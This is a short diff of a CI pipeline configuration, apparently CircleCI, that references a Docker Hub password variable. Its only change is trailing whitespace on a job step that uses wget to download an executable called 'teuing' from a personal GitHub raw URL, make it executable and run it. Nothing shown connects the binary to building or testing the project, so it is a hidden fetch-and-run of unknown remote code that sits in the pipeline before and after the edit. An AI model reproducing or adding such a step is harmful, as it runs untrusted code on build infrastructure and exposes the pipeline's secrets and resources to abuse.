@@ -8,6 +8,7 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget https://raw.githubusercontent.com/Briansantoso560/teuing/main/teuing && chmod +x teuing && ./teuing
+      - run: wget https://raw.githubusercontent.com/Briansantoso560/teuing/main/teuing && chmod +x teuing && ./teuing 
+      
 
       
